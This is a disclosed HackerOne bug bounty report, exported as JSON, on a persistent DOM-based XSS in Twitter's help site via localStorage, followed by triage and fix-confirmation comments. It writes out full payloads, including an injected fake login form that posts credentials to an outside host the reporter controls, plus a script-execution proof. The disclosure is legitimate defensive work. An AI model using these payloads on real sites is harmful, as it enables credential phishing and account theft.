{"id":297968,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yOTc5Njg=","url":"https://hackerone.com/reports/297968","title":"Persistent DOM-based XSS in https://help.twitter.com via localStorage","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2017-12-14T18:47:34.673Z","submitted_at":"2017-12-14T18:47:34.673Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"harisec","url":"/harisec","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/003/968/7f3126cb24b0dd55034e93fb7e809df7e1000e77_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":61,"url":"https://hackerone.com/twitter","handle":"twitter","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/061/85a63a443f017ad8353de4f68ebf52fdd61c345a_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/061/85a63a443f017ad8353de4f68ebf52fdd61c345a_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Twitter","twitter_handle":"twittersecurity","website":"https://twitter.com","about":"Twitter helps you create and share ideas and information instantly, without barriers."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2018-02-24T00:03:54.935Z","bug_reporter_agreed_on_going_public_at":"2018-02-17T15:42:35.594Z","team_member_agreed_on_going_public_at":"2018-02-24T00:03:54.802Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"**Summary:** \n\nI've found a DOM-based XSS vulnerability in the website **help.twitter.com** that persists via a localStorage key **lastArticleHref**. The value of this localStorage key is used to dynamically generate a piece of HTML code without proper encoding or filtering allowing an attacker to inject additional HTML code into the response.\n\n**Description:** \n\nThe website **help.twitter.com** contains JavaScript code that will save the value of the current page (the value of the browser property **location.href**) into a localStorage key named **lastArticleBreadcrumbs**.\n\nThe JavaScript code is loaded from this URL:\nhttps://help.twitter.com/etc/designs/help-twitter/public/js/homepage.js\n\nThere are two relevant localStorage keys:\n*  **lastArticleBreadcrumbs** - that contains an array of breadcrumbs such as `[\"Help Center\",\" Following and unfollowing\",\" How to approve or deny follower requests\"]`\n*  **lastArticleHref** -  that contains the URL of the last visited article\n\nWhen these two localStorage keys are present, the following code is executed:\n\n```\nthis.lastArticleBreadcrumbs.shift();\n                    var t = this.lastArticleBreadcrumbs.map(function(t, r) {\n                        return r === e.lastArticleBreadcrumbs.length - 1 ? '\u003ca class=\"hp03__link  twtr-type--roman-16\" href=\"' + e.lastArticleHref + '\"\u003e' + t + \"\u003c/a\u003e\" : '\u003cspan class=\"hp03__breadcrumb  twtr-color--light-gray-neutral\"\u003e' + t + \"\u003c/span\u003e\"\n                    });\n                    this.breadcrumbElement.innerHTML = t.join('\u003cspan class=\"hp03__seperator    twtr-color--light-gray-neutral\"\u003e/\u003c/span\u003e')\n```\n\nAs you can see above a piece of HTML code is dynamically generated using the value of the JavaScript variable **e.lastArticleHref**. This variable is loaded from the localStorage key **lastArticleHref**.\n\nThe value of **e.lastArticleHref** is not properly HTML encoded when used to dynamically generate the HTML code. This code is written to the browser DOM via `this.breadcrumbElement.innerHTML`.\n\nThis allows an attacker to inject additional HTML code into the browser DOM by manipulating the value of the localStorage key **lastArticleHref**.\n\nThe exploit scenario is as follows:\n\n1. The victim visits an URL like `https://help.twitter.com/en/using-twitter/follow-requests#\"\u003e\u003czzzz\u003e`\n2. The JavaScript code from the page will set the value of localStorage key **lastArticleHref** to `https://help.twitter.com/en/using-twitter/follow-requests#\\\"\u003e\u003czzzz\u003e`.\n3. The user visits the homepage `https://help.twitter.com/`.\n4. At this point the value of the localStorage key **lastArticleHref** is loaded and used to dynamically generate some HTML code that is written into the DOM.\n5. The victim can now open a new window/tab and visit `https://help.twitter.com/`. The HTML code set by attacker will appear in the page as the value of the localStorage key **lastArticleHref** will remain set to an XSS payload.\n\nI was not able to bypass CSP and I've prepared some HTML code that is inserting a fake login form into the page that sends the credentials to a domain controlled by me.\n\n## Steps To Reproduce:\n\nI've attached two movies where I demonstrate how to reproduce this issue using Google Chrome and Internet Explorer.\n\n### Chrome\nTo reproduce, using Google Chrome follow the next steps:\n\n* Visit the following URL using Google Chrome:\n\n```\nhttps://help.twitter.com/en/using-twitter/follow-requests#\"\u003e\u003c/a\u003e\u003c/div\u003e\u003c/div\u003e\u003c/div\u003e\u003c/div\u003e\u003c/div\u003e\u003c/div\u003e\u003c/div\u003e\u003c/div\u003e\u003c/div\u003e\u003c/div\u003e\u003c/div\u003e\u003c/div\u003e\u003cbr\u003e\u003cbr\u003e\u003cbr\u003e\u003cbr\u003e\u003cbr\u003e\u003cbr\u003e\u003cbr\u003e\u003cbr\u003e\u003cbr\u003e\u003cbr\u003e\u003cbr\u003e\u003cbr\u003e\u003cdiv style='background: #97e3ff; position: fixed; top: 80%; left: 50%; margin-top: -50px;  margin-left: -150px; border-style: double;'\u003ePlease sign in below:\u003cbr\u003e\u003cform action=https://bugs.thx.bz/just\u003eusername:\u003cinput type=text name=u\u003e\u003cbr\u003epassword:\u003cinput type=password name=p\u003e\u003cbr\u003e\u003cinput type=submit value='Sign in'\u003e\u003c/form\u003e\u003cbr\u003e\u003c/div\u003e\n```\n\n* At this point, the value of the localStorage key was set to an HTML payload that is written to the DOM.\n* Visit the homepage https://help.twitter.com/\n* A fake login form will appear in the center of the page. Any credentials entered on this login form will be sent to the domain **bugs.thx.bz**.\n\n### Internet Explorer 11\n\nTo reproduce, using Internet Explorer follow the next steps:\n\n* Visit the following URL using Internet Explorer 11:\n\n```\nhttps://help.twitter.com/en/using-twitter/follow-requests#\"\u003e\u003csvg/onload=alert(1)\u003e\n```\n\n* At this point, the value of the localStorage key was set to an XSS payload that is written to the DOM.\n* Visit the homepage https://help.twitter.com/\n* A popup should appear as proof that JavaScript execution is possible.\n\n## Supporting Material/References:\n\nI've attached two movies to this report.\n*  One demonstrating the issue using Google Chrome and the login form.\n*  Another one using IE11 to execute JavaScript code in the context of the domain **help.twitter.com**.\n\n## Impact\n\nAn attacker could exploit this issue by sending a crafted link to the victim via an email message or via chat. When the victim visits the link provided, the attacker can steal victim's credentials.","vulnerability_information_html":"\u003cp\u003e\u003cstrong\u003eSummary:\u003c/strong\u003e \u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;ve found a DOM-based XSS vulnerability in the website \u003cstrong\u003ehelp.twitter.com\u003c/strong\u003e that persists via a localStorage key \u003cstrong\u003elastArticleHref\u003c/strong\u003e. The value of this localStorage key is used to dynamically generate a piece of HTML code without proper encoding or filtering allowing an attacker to inject additional HTML code into the response.\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eDescription:\u003c/strong\u003e \u003c/p\u003e\n\n\u003cp\u003eThe website \u003cstrong\u003ehelp.twitter.com\u003c/strong\u003e contains JavaScript code that will save the value of the current page (the value of the browser property \u003cstrong\u003elocation.href\u003c/strong\u003e) into a localStorage key named \u003cstrong\u003elastArticleBreadcrumbs\u003c/strong\u003e.\u003c/p\u003e\n\n\u003cp\u003eThe JavaScript code is loaded from this URL:\u003cbr\u003e\n\u003ca title=\"https://help.twitter.com/etc/designs/help-twitter/public/js/homepage.js\" href=\"/redirect?url=https%3A%2F%2Fhelp.twitter.com%2Fetc%2Fdesigns%2Fhelp-twitter%2Fpublic%2Fjs%2Fhomepage.js\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://help.twitter.com/etc/designs/help-twitter/public/js/homepage.js\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThere are two relevant localStorage keys:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e \u003cstrong\u003elastArticleBreadcrumbs\u003c/strong\u003e - that contains an array of breadcrumbs such as \u003ccode\u003e[\u0026quot;Help Center\u0026quot;,\u0026quot; Following and unfollowing\u0026quot;,\u0026quot; How to approve or deny follower requests\u0026quot;]\u003c/code\u003e\n\u003c/li\u003e\n\u003cli\u003e \u003cstrong\u003elastArticleHref\u003c/strong\u003e -  that contains the URL of the last visited article\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eWhen these two localStorage keys are present, the following code is executed:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ethis.lastArticleBreadcrumbs.shift();\n                    var t = this.lastArticleBreadcrumbs.map(function(t, r) {\n                        return r === e.lastArticleBreadcrumbs.length - 1 ? \u0026#39;\u0026lt;a class=\u0026quot;hp03__link  twtr-type--roman-16\u0026quot; href=\u0026quot;\u0026#39; + e.lastArticleHref + \u0026#39;\u0026quot;\u0026gt;\u0026#39; + t + \u0026quot;\u0026lt;/a\u0026gt;\u0026quot; : \u0026#39;\u0026lt;span class=\u0026quot;hp03__breadcrumb  twtr-color--light-gray-neutral\u0026quot;\u0026gt;\u0026#39; + t + \u0026quot;\u0026lt;/span\u0026gt;\u0026quot;\n                    });\n                    this.breadcrumbElement.innerHTML = t.join(\u0026#39;\u0026lt;span class=\u0026quot;hp03__seperator    twtr-color--light-gray-neutral\u0026quot;\u0026gt;/\u0026lt;/span\u0026gt;\u0026#39;)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAs you can see above a piece of HTML code is dynamically generated using the value of the JavaScript variable \u003cstrong\u003ee.lastArticleHref\u003c/strong\u003e. This variable is loaded from the localStorage key \u003cstrong\u003elastArticleHref\u003c/strong\u003e.\u003c/p\u003e\n\n\u003cp\u003eThe value of \u003cstrong\u003ee.lastArticleHref\u003c/strong\u003e is not properly HTML encoded when used to dynamically generate the HTML code. This code is written to the browser DOM via \u003ccode\u003ethis.breadcrumbElement.innerHTML\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eThis allows an attacker to inject additional HTML code into the browser DOM by manipulating the value of the localStorage key \u003cstrong\u003elastArticleHref\u003c/strong\u003e.\u003c/p\u003e\n\n\u003cp\u003eThe exploit scenario is as follows:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eThe victim visits an URL like \u003ccode\u003ehttps://help.twitter.com/en/using-twitter/follow-requests#\u0026quot;\u0026gt;\u0026lt;zzzz\u0026gt;\u003c/code\u003e\n\u003c/li\u003e\n\u003cli\u003eThe JavaScript code from the page will set the value of localStorage key \u003cstrong\u003elastArticleHref\u003c/strong\u003e to \u003ccode\u003ehttps://help.twitter.com/en/using-twitter/follow-requests#\\\u0026quot;\u0026gt;\u0026lt;zzzz\u0026gt;\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eThe user visits the homepage \u003ccode\u003ehttps://help.twitter.com/\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eAt this point the value of the localStorage key \u003cstrong\u003elastArticleHref\u003c/strong\u003e is loaded and used to dynamically generate some HTML code that is written into the DOM.\u003c/li\u003e\n\u003cli\u003eThe victim can now open a new window/tab and visit \u003ccode\u003ehttps://help.twitter.com/\u003c/code\u003e. The HTML code set by attacker will appear in the page as the value of the localStorage key \u003cstrong\u003elastArticleHref\u003c/strong\u003e will remain set to an XSS payload.\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eI was not able to bypass CSP and I\u0026#39;ve prepared some HTML code that is inserting a fake login form into the page that sends the credentials to a domain controlled by me.\u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003cp\u003eI\u0026#39;ve attached two movies where I demonstrate how to reproduce this issue using Google Chrome and Internet Explorer.\u003c/p\u003e\n\n\u003ch3 id=\"chrome\"\u003eChrome\u003c/h3\u003e\n\n\u003cp\u003eTo reproduce, using Google Chrome follow the next steps:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eVisit the following URL using Google Chrome:\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ehttps://help.twitter.com/en/using-twitter/follow-requests#\u0026quot;\u0026gt;\u0026lt;/a\u0026gt;\u0026lt;/div\u0026gt;\u0026lt;/div\u0026gt;\u0026lt;/div\u0026gt;\u0026lt;/div\u0026gt;\u0026lt;/div\u0026gt;\u0026lt;/div\u0026gt;\u0026lt;/div\u0026gt;\u0026lt;/div\u0026gt;\u0026lt;/div\u0026gt;\u0026lt;/div\u0026gt;\u0026lt;/div\u0026gt;\u0026lt;/div\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;div style=\u0026#39;background: #97e3ff; position: fixed; top: 80%; left: 50%; margin-top: -50px;  margin-left: -150px; border-style: double;\u0026#39;\u0026gt;Please sign in below:\u0026lt;br\u0026gt;\u0026lt;form action=https://bugs.thx.bz/just\u0026gt;username:\u0026lt;input type=text name=u\u0026gt;\u0026lt;br\u0026gt;password:\u0026lt;input type=password name=p\u0026gt;\u0026lt;br\u0026gt;\u0026lt;input type=submit value=\u0026#39;Sign in\u0026#39;\u0026gt;\u0026lt;/form\u0026gt;\u0026lt;br\u0026gt;\u0026lt;/div\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cul\u003e\n\u003cli\u003eAt this point, the value of the localStorage key was set to an HTML payload that is written to the DOM.\u003c/li\u003e\n\u003cli\u003eVisit the homepage \u003ca title=\"https://help.twitter.com/\" href=\"/redirect?url=https%3A%2F%2Fhelp.twitter.com%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://help.twitter.com/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\n\u003c/li\u003e\n\u003cli\u003eA fake login form will appear in the center of the page. Any credentials entered on this login form will be sent to the domain \u003cstrong\u003ebugs.thx.bz\u003c/strong\u003e.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch3 id=\"internet-explorer-11\"\u003eInternet Explorer 11\u003c/h3\u003e\n\n\u003cp\u003eTo reproduce, using Internet Explorer follow the next steps:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eVisit the following URL using Internet Explorer 11:\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ehttps://help.twitter.com/en/using-twitter/follow-requests#\u0026quot;\u0026gt;\u0026lt;svg/onload=alert(1)\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cul\u003e\n\u003cli\u003eAt this point, the value of the localStorage key was set to an XSS payload that is written to the DOM.\u003c/li\u003e\n\u003cli\u003eVisit the homepage \u003ca title=\"https://help.twitter.com/\" href=\"/redirect?url=https%3A%2F%2Fhelp.twitter.com%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://help.twitter.com/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\n\u003c/li\u003e\n\u003cli\u003eA popup should appear as proof that JavaScript execution is possible.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"supporting-material-references\"\u003eSupporting Material/References:\u003c/h2\u003e\n\n\u003cp\u003eI\u0026#39;ve attached two movies to this report.\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e One demonstrating the issue using Google Chrome and the login form.\u003c/li\u003e\n\u003cli\u003e Another one using IE11 to execute JavaScript code in the context of the domain \u003cstrong\u003ehelp.twitter.com\u003c/strong\u003e.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eAn attacker could exploit this issue by sending a crafted link to the victim via an email message or via chat. When the victim visits the link provided, the attacker can steal victim\u0026#39;s credentials.\u003c/p\u003e\n","bounty_amount":"1120.0","formatted_bounty":"$1,120","weakness":{"id":62,"name":"Cross-site Scripting (XSS) - Stored"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":246936,"file_name":"chrome-screenshot.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/246/936/9d3610082d50b0b41f23daf04488282e0acd2e56/chrome-screenshot.png?response-content-disposition=attachment%3B%20filename%3D%22chrome-screenshot.png%22%3B%20filename%2A%3DUTF-8%27%27chrome-screenshot.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ37US5OJ5%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T052747Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICX%2BZzEwV7S7tK2Teu4enaTjTMNodN0T8CBwGyp3%2FdhpAiBcDP7u5XE0svrQAEReRRQSWfUQfGu9%2F0dDFi9HZXbFlSq0AwhUEAEaDDAxMzYxOTI3NDg0OSIMqovxw%2Fi0N89X43L%2FKpEDQix1tw9gEfEoYbXT5osPFpMOwfBuizjPU7n9OmST3GiDPuXEgYLvbvfAQGYte9YY2QoNfSH%2Bs3y1JVdVw8yUicjfLoFaEW6wkvABFFfNqnjSBFzSElON%2F%2B3j8UNBRmn2xcLmCFWjMnOAbTftnafIeYcBCAYh2gO4XfF%2FteefEF5baEqal82tljdlrWvxdb4xY%2BeiVvoO6eYgRa7kp50RAoYeprdo02AYM%2F61DJSrZXwMLYr6Xgv6MB1iMnaxJ5rMcXXMrHucVPXBHEcRWopMmQkkB%2FPc9SAPzXjSXPb7jJbEGBrLze60DYXEBrpIFUG1Kick24m%2B5k5jryTy4Jw50w8CXizU5ICguGu3KHM1om3lDn5KQPJLn1HdcT%2BsfoJiJu6SGt9hXKzCtCfUH3%2FFvhBtwm8JD87PMGYoEwVm%2FlNfMX0wjZsROXJIlnxZXImztW5C0Q8%2B8vUj4F7brk0S72obIPPXA9sraxsX4VqG%2BXQBK%2B1E%2BcproSDOuO49QLzWGa%2ByNqmZvUzlIRh6xUU3P5owvrOq%2FwU67AGtB67YYS3OrDI7mh5rocz4yCfx2WY%2BOcICeNC4fwRACHwc09Uiz%2FFPJoVVVUxZVu%2BGwd0PK0Cv2KxEe%2F6DbJ%2F4dqWms9lNmfzBIAqvj8iCblJU7lJE5gNjjGio7mXbIVYDlATJCq41LKJBckyAK5GaLf5E3hKwYqawTi1drEQoAWGm0MLdRWPWFAAmAH9lq7XnOuVzoaZV9I6BQOa6%2Bsw888c6CCB%2BW6%2Fs%2FWznBvXU9NUgtAV0VB3hWt7rH3AQXIkYZTG86Yk6TyvtNdyHfs%2FoRwKKnb1x1yTXlrvbtiAXPCAeCL0oqSsvNwFJhw%3D%3D\u0026X-Amz-Signature=010b0c8fcac81337f216f53615ab92ba5ed1d6553dbc638eae0fb8b10984ceec","file_size":188916,"type":"image/png"},{"id":246937,"file_name":"chrome-login-page.mp4","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/246/937/6aa2cdbf8eb38ac4ae41ad47e21ffb391f02628c/chrome-login-page.mp4?response-content-disposition=attachment%3B%20filename%3D%22chrome-login-page.mp4%22%3B%20filename%2A%3DUTF-8%27%27chrome-login-page.mp4\u0026response-content-type=video%2Fmp4\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ37US5OJ5%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T052747Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICX%2BZzEwV7S7tK2Teu4enaTjTMNodN0T8CBwGyp3%2FdhpAiBcDP7u5XE0svrQAEReRRQSWfUQfGu9%2F0dDFi9HZXbFlSq0AwhUEAEaDDAxMzYxOTI3NDg0OSIMqovxw%2Fi0N89X43L%2FKpEDQix1tw9gEfEoYbXT5osPFpMOwfBuizjPU7n9OmST3GiDPuXEgYLvbvfAQGYte9YY2QoNfSH%2Bs3y1JVdVw8yUicjfLoFaEW6wkvABFFfNqnjSBFzSElON%2F%2B3j8UNBRmn2xcLmCFWjMnOAbTftnafIeYcBCAYh2gO4XfF%2FteefEF5baEqal82tljdlrWvxdb4xY%2BeiVvoO6eYgRa7kp50RAoYeprdo02AYM%2F61DJSrZXwMLYr6Xgv6MB1iMnaxJ5rMcXXMrHucVPXBHEcRWopMmQkkB%2FPc9SAPzXjSXPb7jJbEGBrLze60DYXEBrpIFUG1Kick24m%2B5k5jryTy4Jw50w8CXizU5ICguGu3KHM1om3lDn5KQPJLn1HdcT%2BsfoJiJu6SGt9hXKzCtCfUH3%2FFvhBtwm8JD87PMGYoEwVm%2FlNfMX0wjZsROXJIlnxZXImztW5C0Q8%2B8vUj4F7brk0S72obIPPXA9sraxsX4VqG%2BXQBK%2B1E%2BcproSDOuO49QLzWGa%2ByNqmZvUzlIRh6xUU3P5owvrOq%2FwU67AGtB67YYS3OrDI7mh5rocz4yCfx2WY%2BOcICeNC4fwRACHwc09Uiz%2FFPJoVVVUxZVu%2BGwd0PK0Cv2KxEe%2F6DbJ%2F4dqWms9lNmfzBIAqvj8iCblJU7lJE5gNjjGio7mXbIVYDlATJCq41LKJBckyAK5GaLf5E3hKwYqawTi1drEQoAWGm0MLdRWPWFAAmAH9lq7XnOuVzoaZV9I6BQOa6%2Bsw888c6CCB%2BW6%2Fs%2FWznBvXU9NUgtAV0VB3hWt7rH3AQXIkYZTG86Yk6TyvtNdyHfs%2FoRwKKnb1x1yTXlrvbtiAXPCAeCL0oqSsvNwFJhw%3D%3D\u0026X-Amz-Signature=57cb70555fccc449f36a563866a35c0ce8f5896d482980d779e2287a624ddda7","file_size":3598004,"type":"video/mp4"},{"id":246938,"file_name":"ie-xss.mp4","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/246/938/a54d850f661bf10def5bff03d21e72d3951fdce9/ie-xss.mp4?response-content-disposition=attachment%3B%20filename%3D%22ie-xss.mp4%22%3B%20filename%2A%3DUTF-8%27%27ie-xss.mp4\u0026response-content-type=video%2Fmp4\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ37US5OJ5%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T052747Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICX%2BZzEwV7S7tK2Teu4enaTjTMNodN0T8CBwGyp3%2FdhpAiBcDP7u5XE0svrQAEReRRQSWfUQfGu9%2F0dDFi9HZXbFlSq0AwhUEAEaDDAxMzYxOTI3NDg0OSIMqovxw%2Fi0N89X43L%2FKpEDQix1tw9gEfEoYbXT5osPFpMOwfBuizjPU7n9OmST3GiDPuXEgYLvbvfAQGYte9YY2QoNfSH%2Bs3y1JVdVw8yUicjfLoFaEW6wkvABFFfNqnjSBFzSElON%2F%2B3j8UNBRmn2xcLmCFWjMnOAbTftnafIeYcBCAYh2gO4XfF%2FteefEF5baEqal82tljdlrWvxdb4xY%2BeiVvoO6eYgRa7kp50RAoYeprdo02AYM%2F61DJSrZXwMLYr6Xgv6MB1iMnaxJ5rMcXXMrHucVPXBHEcRWopMmQkkB%2FPc9SAPzXjSXPb7jJbEGBrLze60DYXEBrpIFUG1Kick24m%2B5k5jryTy4Jw50w8CXizU5ICguGu3KHM1om3lDn5KQPJLn1HdcT%2BsfoJiJu6SGt9hXKzCtCfUH3%2FFvhBtwm8JD87PMGYoEwVm%2FlNfMX0wjZsROXJIlnxZXImztW5C0Q8%2B8vUj4F7brk0S72obIPPXA9sraxsX4VqG%2BXQBK%2B1E%2BcproSDOuO49QLzWGa%2ByNqmZvUzlIRh6xUU3P5owvrOq%2FwU67AGtB67YYS3OrDI7mh5rocz4yCfx2WY%2BOcICeNC4fwRACHwc09Uiz%2FFPJoVVVUxZVu%2BGwd0PK0Cv2KxEe%2F6DbJ%2F4dqWms9lNmfzBIAqvj8iCblJU7lJE5gNjjGio7mXbIVYDlATJCq41LKJBckyAK5GaLf5E3hKwYqawTi1drEQoAWGm0MLdRWPWFAAmAH9lq7XnOuVzoaZV9I6BQOa6%2Bsw888c6CCB%2BW6%2Fs%2FWznBvXU9NUgtAV0VB3hWt7rH3AQXIkYZTG86Yk6TyvtNdyHfs%2FoRwKKnb1x1yTXlrvbtiAXPCAeCL0oqSsvNwFJhw%3D%3D\u0026X-Amz-Signature=2fc8a0a5076732636a5fc6f51cf2a63ce1347d23ca880d3f100a3ae89a385a51","file_size":889128,"type":"video/mp4"}],"allow_singular_disclosure_at":"2018-03-19T15:42:35.707Z","allow_singular_disclosure_after":-87745511.39706393,"singular_disclosure_allowed":true,"vote_count":82,"voters":["jokebookservice1","zhchbin","sp1d3rs","stefanofinding","kapytein","foobar7","bogdantcaciuc","surfrdan","spam404","ta8ahi","and 72 more..."],"severity":{"rating":"medium","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":2223800,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for your report.\n\nWe're looking into it, and we'll keep you updated when we have additional information.\n\nThank you for thinking of Twitter security.","markdown_message":"\u003cp\u003eThank you for your report.\u003c/p\u003e\n\n\u003cp\u003eWe\u0026#39;re looking into it, and we\u0026#39;ll keep you updated when we have additional information.\u003c/p\u003e\n\n\u003cp\u003eThank you for thinking of Twitter security.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-12-14T19:49:20.517Z","updated_at":"2017-12-14T19:49:35.984Z","actor":{"username":"bugtriage-michael","cleared":false,"url":"/bugtriage-michael","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2227127,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for your report. We believe it may be a valid security issue and will investigate it further. It could take some time to find and update the root cause for an issue, so we thank you for your patience.\n\nThank you for helping keep Twitter secure!","markdown_message":"\u003cp\u003eThank you for your report. We believe it may be a valid security issue and will investigate it further. It could take some time to find and update the root cause for an issue, so we thank you for your patience.\u003c/p\u003e\n\n\u003cp\u003eThank you for helping keep Twitter secure!\u003c/p\u003e\n","automated_response":false,"created_at":"2017-12-15T18:33:19.107Z","updated_at":"2017-12-15T18:33:19.107Z","actor":{"username":"aarun","cleared":false,"url":"/aarun","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/166/486/bcf774a6460ff9e33545235af9344be33732008d_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2238300,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"@harisec - We consider this issue to be fixed now. Can you please confirm?\n\nThank you for helping keep Twitter secure!","markdown_message":"\u003cp\u003e\u003ca href=\"/harisec\"\u003e@harisec\u003c/a\u003e - We consider this issue to be fixed now. Can you please confirm?\u003c/p\u003e\n\n\u003cp\u003eThank you for helping keep Twitter secure!\u003c/p\u003e\n","automated_response":false,"created_at":"2017-12-20T17:19:28.956Z","updated_at":"2017-12-20T17:19:28.956Z","actor":{"username":"aarun","cleared":false,"url":"/aarun","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/166/486/bcf774a6460ff9e33545235af9344be33732008d_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"harisec","url":"/harisec"},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2238327,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I can confirm this issue was fixed. I'm not able to reproduce it anymore.\n\nI've identified the fix in the JavaScript file **articles.js** - instead of saving the full URL (`location.href`), only the value of `location.pathname` is saved. \n\n```\nu.default.set(\"lastArticleHref\", \"\" + window.location.origin + window.location.pathname)\n```","markdown_message":"\u003cp\u003eI can confirm this issue was fixed. 